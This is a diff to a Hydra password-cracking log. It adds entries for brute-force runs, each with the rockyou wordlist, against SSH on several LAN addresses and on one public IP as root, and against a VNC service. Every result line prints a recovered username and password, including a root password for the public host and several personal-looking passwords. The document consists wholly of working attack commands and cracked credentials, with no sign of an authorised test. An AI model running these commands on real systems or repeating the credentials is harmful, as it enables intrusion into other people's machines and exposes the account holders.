@@ -7,3 +7,10 @@
 [22][ssh] host: 192.168.1.91   login: will   password: Cmonster2006
 # Hydra v9.5 run at 2023-10-14 14:05:15 on 192.168.1.91 ssh (hydra -l kali -P rockyou.txt -t 64 -vV -o output.log -I ssh://192.168.1.91:22)
 [22][ssh] host: 192.168.1.91   login: kali   password: kali
+# Hydra v9.5 run at 2023-10-15 15:52:31 on 192.168.1.91 ssh (hydra -l kali -P rockyou.txt -t 64 -vV -o output.log -I ssh://192.168.1.91:22)
+[22][ssh] host: 192.168.1.91   login: kali   password: kali
+# Hydra v9.5 run at 2023-10-17 12:56:59 on 139.144.27.137 ssh (hydra -l root -P rockyou.txt -t 64 -vV -o output.log -I ssh://139.144.27.137:22)
+[22][ssh] host: 139.144.27.137   login: root   password: Cmonster2006!@#!@#!@#
+# Hydra v9.5 run at 2023-10-17 14:54:18 on 192.168.1.91 ssh (hydra -l kali1 -P rockyou.txt -t 64 -vV -o output.log -I ssh://192.168.1.91)
+# Hydra v9.5 run at 2023-10-17 14:55:50 on 192.168.1.38 vnc (hydra -P rockyou.txt -t 64 -vV -o output.log -I vnc://192.168.1.38)
+[5900][vnc] host: 192.168.1.38   password: Keefe5195
